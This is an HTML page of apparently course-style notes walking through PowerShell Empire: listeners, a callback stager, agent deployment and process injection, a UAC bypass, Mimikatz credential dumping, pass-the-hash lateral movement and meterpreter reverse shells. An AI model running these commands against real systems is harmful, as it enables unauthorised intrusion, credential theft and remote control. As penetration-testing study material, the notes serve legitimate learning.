<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>PowerShell Empire</title>
</head><body>PowerShell Empire is a PowerShell and Python exploitation and post-exploitation agent with focus on client-side exploitation and post-exploitation for Active Directory deployments<br/>
Exploitation and post-exploitation are performed using PowerShell on Windows and Python on Linux and MacOS<br/>
Empire relies on pre-installed libraries and features and requires PowerShell v2 on Windows and Python v2.6 or 2.7 on Linux and MacOS<br/>
Empire is not installed by default and needs to be installed manually:<ul><li style="list-style-type: none">sudo apt install powershell-empire &nbsp;</li>
<li style="list-style-type: none">powershell-empire</li>
</ul>
PowerShell Empire syntax:<ul><li style="list-style-type: none">(Empire) &gt; help</li>
</ul>
Listeners and Stagers:<ul><li style="list-style-type: none">Listeners accept inbound connections from various Empire agents</li>
<li style="list-style-type: none">Stagers are small pieces of code generated by Empire that are executed on the victim and connect back to a listener, facilitating the transfer to the victim of a staged payload</li>
<li style="list-style-type: none">To begin an Empire session, we will first enter the listener context: (Empire) &gt; listeners</li>
<li style="list-style-type: none">Then we print the available listeners: (Empire: listeners) &gt; uselistener [TAB] [TAB] </li>
<li style="list-style-type: none">Once we have decided on which listener to use (for example the http listener), we select it: (Empire: listeners) &gt; uselistener http</li>
<li style="list-style-type: none">We then run the info command to shop the listener information and syntax: (Empire: listeners/http) &gt; info </li>
<li style="list-style-type: none">Important listener options to set:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Host</li>
<li style="list-style-type: none">Port</li>
<li style="list-style-type: none">DefaultDelay</li>
<li style="list-style-type: none">DefaultJitter</li>
<li style="list-style-type: none">KillDate</li>
</ul>
</li>
<li style="list-style-type: none">Example of setting an option: </li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: listeners/http) &gt; set Host 10.11.0.4</li>
</ul>
</li>
<li style="list-style-type: none">Once the options are set, we can start the listener with the execute command: </li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: listeners/http) &gt; execute</li>
</ul>
</li>
<li style="list-style-type: none">We can go back to the main menu with the command back: </li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: listeners/http) &gt; back</li>
</ul>
</li>
<li style="list-style-type: none">We can then list all available stagers with the command: </li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: listeners) &gt; usestager [TAB] [TAB]</li>
</ul>
</li>
<li style="list-style-type: none">To select the desired stager: </li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: listeners) &gt; usestager windows/launcher_bat</li>
</ul>
</li>
<li style="list-style-type: none">We can review the stager options with the info command: </li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: stager/windows/launcher_bat) &gt; info</li>
</ul>
</li>
<li style="list-style-type: none">Important stager options to set:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Listener</li>
</ul>
</li>
<li style="list-style-type: none">We can set the listener for our stager with the set command: </li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: stager/windows/launcher_bat) &gt; set Listener http</li>
</ul>
</li>
<li style="list-style-type: none">Finally, we create the stager with the execute command: </li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: stager/windows/launcher_bat) &gt; execute</li>
</ul>
</li>
<li style="list-style-type: none">We can have a look at the generated stager opening the file /tmp/launcher.bat:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">less /tmp/launcher.bat</li>
</ul>
</li>
<li style="list-style-type: none">The stager is a base64 encoded PowerShell command string. The first stage payload will connect to the listener and fetch the rest of the Empire Agent code</li>
</ul>
The Empire Agent:<ul><li style="list-style-type: none">With the listener running and the stager prepared, we now need to deploy the agent on the victim. The agent is the final payload retrieved by the stager and will alows us to execute commands and interact with the victim system</li>
<li style="list-style-type: none">The stager deletes itself and exits once it finishes execution</li>
<li style="list-style-type: none">Once the agent is operational on the target, it will established an AES ecrypted communication channel with the listener, using the data portion of the HTTP GET and POST requests</li>
<li style="list-style-type: none">To deploy our agent we need to copy the launche.bat file to the target Windows system and execute from a command prompt</li>
<li style="list-style-type: none">Once the agent is executed, we go back to the Empire console on our attacker machine and we see that Empire has received the agent call.</li>
<li style="list-style-type: none">We can display all active agents with the agents command:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: stager/windows/launcher_bat) &gt; agents</li>
</ul>
</li>
<li style="list-style-type: none">Now we can interact with the desired agent using the interact command and the agent name (63WFMDBUS in the case of our example):</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: stager/windows/launcher_bat) &gt; interact 63WFMDBUS</li>
</ul>
</li>
<li style="list-style-type: none">Let"s use the agent to run sysinfo on the victim:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: 63WFMDBUS) &gt; sysinfo</li>
</ul>
</li>
<li style="list-style-type: none">From within the agent, the help command shows all available commands:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: 63WFMDBUS) &gt; help</li>
</ul>
</li>
<li style="list-style-type: none">Useful commands are:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">upload</li>
<li style="list-style-type: none">download</li>
<li style="list-style-type: none">exit</li>
<li style="list-style-type: none">shell (to open a command prompt)</li>
<li style="list-style-type: none">spawn (to create an additional agent on the same host)</li>
</ul>
</li>
<li style="list-style-type: none">Like metasploit, Empire allows us to migrate the payload to a different process</li>
<li style="list-style-type: none">We first list all running processes with ps</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: 63WFMDBUS) &gt; ps</li>
</ul>
</li>
<li style="list-style-type: none">Once we have chosen our target process, we can inject the payload with the psinject command, and the name of the listener and the target process id as command arguments:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: 63WFMDBUS) &gt; psinject http 252</li>
</ul>
</li>
<li style="list-style-type: none">Unlike th emigration feature in metasploit with meterpreter, once the migration process is completed, the original Empire agent remains active and we need to manually switch to the newly created one (with name WTUE31AV):</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: 63WFMDBUS) &gt; agents</li>
<li style="list-style-type: none">(Empire: agents) &gt; interact WTUE31AV</li>
<li style="list-style-type: none">(Empire: WTUE31AV) &gt;</li>
</ul>
</li>
</ul>
PowerShell Modules:<ul><li style="list-style-type: none">The power of PowerShell and Empire comes from the many modules available. To list all the available modules we can use the usemodule command:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: WTUE31AV) &gt; usemodule [TAB] [TAB]</li>
</ul>
</li>
</ul>
Situational Awareness:<ul><li style="list-style-type: none">Let us investigate the get-user module:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: WTUE31AV) &gt; usemodule situational_awareness/network/powerview/get_user</li>
</ul>
</li>
<li style="list-style-type: none">We can explore the options of the module with the info command:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: powershell/situational_awareness/network/powerview/get_user) &gt; info</li>
</ul>
</li>
<li style="list-style-type: none">Important module options are:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Name</li>
<li style="list-style-type: none">Module</li>
<li style="list-style-type: none">Language</li>
<li style="list-style-type: none">NeedsAdmin (set to true if module needs local admin privileges)</li>
<li style="list-style-type: none">OpsecSafe (set to true if we wish to avoid to leave behind proofs of compromise to evade endpoint protections machenisms)</li>
<li style="list-style-type: none">MinLanguageVersion (minimum version of PowerShell required to execute the script)</li>
</ul>
</li>
<li style="list-style-type: none">Finally, we will run the module with the execute command:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: powershell/situational_awareness/network/powerview/get_user) &gt; execute</li>
</ul>
</li>
<li style="list-style-type: none">To be noted that the situational_awareness category also includes a wide variety of network and port scanners</li>
</ul>
Credentials and privilege escalation:<ul><li style="list-style-type: none">One of the most interesting modules in this group for privilege escalation is the "powerup allchecks" module</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: powershell/situational_awareness/network/powerview/get_user) &gt; usemodule powershell/privesc/powerup</li>
<li style="list-style-type: none">(Empire: powershell/privesc/powerup/allchecks) &gt; execute</li>
</ul>
</li>
<li style="list-style-type: none">Another useful module is the bypassuac_fodhelper module, especially hany if we have a local admin access level. Depending on the Windows version, this module can bypass UAC and launch a high integrity PowerShell Empire agent:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: powershell/privesc/powerup/allchecks) &gt; usemodule powershell/privesc/bypassuac_fodhelper</li>
</ul>
</li>
<li style="list-style-type: none">Before launching this module, we need to configure our listener:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: powershell/privesc/bypassuac_fodhelper) &gt; info</li>
<li style="list-style-type: none">(Empire: powershell/privesc/bypassuac_fodhelper) &gt; set Listener http</li>
<li style="list-style-type: none">(Empire: powershell/privesc/bypassuac_fodhelper) &gt; execute</li>
</ul>
</li>
<li style="list-style-type: none">Once we have obtained Local Admin privileges on the Windows victim, we can then execute commands that require that integrity leve, such as Mimikatz to dump password hashes. The credentials category contains multiple Mimikatz commands that have been imported into Empire. The following command shows all available credentials modules:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: 78PSBD4H) &gt; usemodule credentials/ [TAB] [TAB]</li>
</ul>
</li>
<li style="list-style-type: none">To be noted that if an "*" is printed aside to a module"s name, that module requires Local Admin integrity level. Let"'s have a closer look at a high integrity module, such as mimikatz/logonpasswords:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: 78PSBD4H) &gt; usemodule powershell/credentials/mimikatz/logonpasswords</li>
<li style="list-style-type: none">(Empire: powershell/credentials/mimikatz/logonpasswords) &gt; execute</li>
</ul>
</li>
<li style="list-style-type: none">The credentials found by that module are not only printed to screen as output of the command, but also stored in the Empire credentials store, enumerated with the creds command:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: powershell/credentials/mimikatz/logonpasswords) &gt; creds</li>
</ul>
</li>
</ul>
Lateral movement:<ul><li style="list-style-type: none">Let's attempt to perform lateral movement and reach the domain controller, that is located on a network that is not directly reachable from our attacker kali machine</li>
<li style="list-style-type: none">To list all available lateral movement modules:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: powershell/credentials/mimikatz/logonpasswords) &gt; usemodule powershell/lateral_movement/ [TAB] [TAB]</li>
</ul>
</li>
<li style="list-style-type: none">As an example, we will use the invoke_smbexec module:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: powershell/credentials/mimikatz/logonpasswords) &gt; usemodule powershell/lateral_movement/invoke_smbexec</li>
<li style="list-style-type: none">(Empire: powershell/lateral_movement/invoke_smbexec) &gt; info</li>
<li style="list-style-type: none">(Empire: powershell/lateral_movement/invoke_smbexec) &gt; set ComputerName win10-x86</li>
<li style="list-style-type: none">(Empire: powershell/lateral_movement/invoke_smbexec) &gt; set Listener http</li>
<li style="list-style-type: none">(Empire: powershell/lateral_movement/invoke_smbexec) &gt; set Hash blablablajeff_adminpasswordhash</li>
<li style="list-style-type: none">(Empire: powershell/lateral_movement/invoke_smbexec) &gt; set Domain corp.com</li>
<li style="list-style-type: none">(Empire: powershell/lateral_movement/invoke_smbexec) &gt; execute</li>
</ul>
</li>
<li style="list-style-type: none">BINGO! The agent was successfully deployed and we can now interact with it:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">(Empire: powershell/lateral_movement/invoke_smbexec) &gt; agents</li>
<li style="list-style-type: none">(Empire: agents) &gt; interact 4D9FH8GA</li>
<li style="list-style-type: none">(Empire: 4D9FH8GA) &gt; </li>
</ul>
</li>
</ul>
Switching between Empire and Metasploit<ul><li style="list-style-type: none">A possible integration of Metasploit and Empire can be showcased as follows:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">We use msfvenom to craft a malicious PW with a reverse meterpreter shell in it</li>
<li style="list-style-type: none">We setup a local meterpreter listener on localhost with Metasploit</li>
<li style="list-style-type: none">We then use Empire to upload the malicious PE to the Windows victim</li>
<li style="list-style-type: none">Finally we use Empire to execute the malicious file on the Windows victim with the Empire shell command</li>
<li style="list-style-type: none">And we then verify that a meterpreter session was opened on our attacker kali machine </li>
</ul>
</li>
<li style="list-style-type: none">Connecting to an Empire agent from an existing meterpeter sesison is also simple:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">We first create a launcher with Empire </li>
<li style="list-style-type: none">We also set the listener in Empire</li>
<li style="list-style-type: none">Then we use the existing meterpeter session to upload and execute it with the upload and shell commands rispectively</li>
<li style="list-style-type: none">Once we have executed the launcher.bat, we will receive an agent call on our Empire listener</li>
</ul>
</li>
</ul>
</body></html>